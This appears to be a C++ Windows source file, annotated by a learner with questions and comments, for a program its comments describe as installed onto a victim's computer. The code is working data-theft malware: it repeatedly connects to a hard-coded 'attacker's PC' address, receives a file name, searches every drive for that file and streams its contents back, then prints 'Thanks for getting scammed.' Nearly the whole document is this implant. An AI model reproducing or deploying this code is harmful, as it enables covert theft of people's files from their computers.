/***********************/
//question...
/***********************/

/*
*
*it is a program installed onto victim's computer
*
*/


#include "pch.h"
#include <WinSock2.h>
#include <Windows.h>
#include <iostream>
#include <string>
#include <vector>
#include <fstream>

#pragma comment(lib, "ws2_32.lib")

char getDiskLetter(int diskNum) { //disk 
	switch (diskNum) {
	case 1:
		return 'A';
	case 2:
		return 'B';
	case 4:
		return 'C';
	case 8:
		return 'D';
	case 16:
		return 'E';
	case 32:
		return 'F';
	}
	return '-';
}
/***********************/
//why decimal number 1 corresponds to 'A', 2 corrensponds to 'B'...
/***********************/

/*
this function is to locate a certain file
/param path: the path for searching the file
/param fileName: the name of the file to be searched.
*/
char *findFile(const char* path, const char *fileName) {

	HANDLE handleFind;
	WIN32_FIND_DATAA info; //Contains information about the file 
	std::string pathHelper;

	handleFind = FindFirstFileA(path, &info);

	if (handleFind != INVALID_HANDLE_VALUE) {
		do {
			if ((info.cFileName[0] != '.' && info.cFileName[1] != '\0') &&
				(info.cFileName[0] != '.' && info.cFileName[1] != '.' && info.cFileName[2] != '\0')) {
				
				if (strcmp(info.cFileName, fileName) == 0 && info.dwFileAttributes != FILE_ATTRIBUTE_DIRECTORY) {
					pathHelper = path;
					pathHelper.pop_back();
/***********************/
//why pop_back()? It occurs the parameter "path" passed to the function, and the "info".
/***********************/
					pathHelper += info.cFileName;
					char *file = new char[pathHelper.length()];
					strcpy(file, pathHelper.c_str());
					return file; //file found
				}

				if (info.dwFileAttributes == FILE_ATTRIBUTE_DIRECTORY) {
					pathHelper = path;
					pathHelper.pop_back();
					pathHelper += info.cFileName;
					pathHelper += "\\*";
					char *filePath = findFile(pathHelper.c_str(), fileName); //if it is a directory
					//Depth first
					if (filePath != nullptr)
						return filePath;
				}
			}
		} while (FindNextFileA(handleFind, &info));

		FindClose(handleFind);
	}
	return nullptr;
}

int main()
{
	WSADATA wsas;//a structure stores information of the sockets
	int error;
	WORD ver;
	ver = MAKEWORD(2, 0);
	//initiate the use of "Ws2_32.dll" by a processss. 
	error = WSAStartup(ver, &wsas);
	if (error != 0) {
		WSACleanup();
		return -1;
	}

	SOCKET server;
	server = socket(AF_INET, SOCK_STREAM, 0);
	//it looks like a client program.
	if (server == INVALID_SOCKET) {
		WSACleanup();
		return -2;
	}

	struct sockaddr_in sa;
	memset((void *)(&sa), 0, sizeof(sa));
	sa.sin_family = AF_INET;
	sa.sin_port = htons(8080);
	sa.sin_addr.s_addr = inet_addr("192.168.0.16");//the IP of attacker's PC

	error = connect(server, (struct sockaddr FAR*)&sa, sizeof(sa)); //The connect function establishes a connection to a specified socket.
	while (error == SOCKET_ERROR) //continue until connected
		error = connect(server, (struct sockaddr FAR*)&sa, sizeof(sa));

	std::cout << "Connected" << std::endl;
	//TODO client behavior
	char fileSearch[256];
	for (int i = 0; i < 256; i++)
		fileSearch[i] = 0;
	recv(server, fileSearch, 256, 0);//The recv function receives data from a connected socket or a bound connectionless socket.


	DWORD disk = GetLogicalDrives(); //Retrieves a bitmask representing the currently available disk drives.
//Return Values
//If the function succeeds, 
//the return value is a bitmask representing the currently available disk drives. 
//Bit position 0 (the least-significant bit) is drive A, bit position 1 is drive B, bit position 2 is drive C, and so on. 


	char *filePath = nullptr;
	std::cout << "Looking for file: " << fileSearch << std::endl;
	for (int i = 1; i < 32; i *= 2) {
		if ((disk & i) != 0) {
			std::string startPath;
			startPath += getDiskLetter(i);
			std::cout << "Looking at disk " << startPath << std::endl;
			startPath += ":\\*";
			//if have access to a disk then search it.
			filePath = findFile(startPath.c_str(), fileSearch);
			if (filePath != nullptr) //file found
				break;
		}
	}

	if (filePath != nullptr) {
		std::cout << "File found" << std::endl;
		FILE *fileToSend = fopen(filePath, "rb");
		if (fileToSend != nullptr) {
			char buff[4096];
			long sent = 0;
			std::cout << "Sending..." << std::endl;
			//Yes, it is a executable installed onto victim't PC.
			while (!feof(fileToSend)) {
				int read;
				if ((read = fread(&buff, 1, 4096, fileToSend)) != 0)
					sent += send(server, buff, read, 0); //The send function sends data on a connected socket.

			}
			fclose(fileToSend);
			std::cout << "File sent" << std::endl;
		}
		else
			std::cout << "Error opening file" << std::endl;
	}
	else
		std::cout << "File not found" << std::endl;
	
	std::cout << "Thanks for getting scammed.";
	return 0;
}

